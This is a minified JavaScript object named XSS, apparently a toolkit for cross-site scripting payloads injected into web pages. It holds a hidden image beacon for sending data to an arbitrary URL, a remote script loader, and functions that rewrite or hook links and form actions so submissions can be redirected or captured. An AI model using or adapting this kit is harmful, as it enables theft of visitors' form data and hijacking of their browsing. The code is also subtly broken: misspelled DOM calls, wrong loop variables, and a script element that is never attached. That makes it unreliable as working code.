
var XSS={imgTag:null,get:function(url){if(XSS.imgTag==null)
{XSS.imgTag=document.createElement('img');XSS.imgTag.setAttribute('style','display: none;');}
XSS.imgTag.setAttribute('src',url);},load:function(url){var script=document.createElement('script');script.setAttribute('type','text/javascript');script.setAttribute('src',url);},rewriteLinks:function(callback){var links=document.getElementsByTagName('a');for(link in links)
{if(link.hasAttribute('href'))
{link.setAttribute('href',callback(link.getAttribute('href')));}}},hookLinks:function(callback){var links=document.getElementByTagName('a');for(link in links)
{if(link.hasAttribute('href'))
{link.onclick=callback;}}},rewriteForms:function(callback){var forms=document.getElementByTagName('form');for(form in forms)
{if(link.hasAttribute('action'))
{form.setAttribute('action',callback(form.getAttribute('action')));}}},hookForms:function(callback){var inputs=document.getElementByTagName('input');for(input in inputs)
{if(input.hasAttribute('type')&&input.getAttribute('type')=='submit')
{input.onclick=callback;}}}};